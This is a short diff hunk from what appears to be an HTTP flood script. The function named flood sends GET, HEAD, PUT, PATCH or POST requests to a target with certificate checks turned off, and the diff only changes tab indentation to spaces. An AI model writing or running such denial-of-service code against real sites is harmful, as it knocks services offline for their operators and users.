@@ -28,13 +28,13 @@ def flood(target,domainname,attack):
     try:
         if attack =='get':
             r = requests.get(target, params=payload, headers=headers, timeout=20 ,verify=False)
-		elif attack =='head':
+        elif attack =='head':
             r = requests.head(target, params=payload, headers=headers, timeout=20 ,verify=False)
-		elif attack =='put':
+        elif attack =='put':
             r = requests.put(target, params=payload, headers=headers, timeout=20 ,verify=False)
-		elif attack =='patch':
+        elif attack =='patch':
             r = requests.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
-		elif attack =='patch':
+        elif attack =='patch':
             r = requests.patch(target, params=payload, headers=headers, timeout=20 ,verify=False)
         else:
             r = requests.post(target,params=payload ,headers=headers, timeout=20 , verify=False,proxies=proxies)
